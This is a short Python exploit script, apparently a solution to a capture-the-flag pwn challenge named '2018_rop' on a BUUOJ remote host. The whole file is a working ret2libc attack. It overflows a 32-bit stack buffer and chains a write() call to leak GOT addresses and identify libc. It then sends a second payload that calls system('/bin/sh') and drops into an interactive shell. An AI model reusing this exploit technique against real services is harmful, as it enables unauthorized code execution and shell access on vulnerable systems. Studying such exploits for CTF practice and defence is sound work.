import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=False,
    file='./2018_rop',
    remote='node4.buuoj.cn:25475',
))
s = sgtlibc.Searcher()
# load target and show its checksec
elf = sgtlibc.ROPgadgets.ELF(client.tube_file)
pops = elf.get_rop()

plt_write = elf.plt['write']
main_addr = elf.symbols['main']


def leak(func: str):
    payload = b'a' * (136 + 4)
    payload += p32(plt_write) + p32(main_addr) + p32(0) + \
        p32(elf.got[func]) + p32(100)  # write(0,got,100)
    sl(payload)
    data = rc(4)  # 32位接收4个
    rc()
    data = u32(data)
    s.add_condition(func, data)
    print('leak', func, hex(data))
    return data


got_write = leak('write')
leak('read')

data = s.dump()

system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
payload = b'a' * (136 + 4)
payload += p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
sl(payload)
interactive()
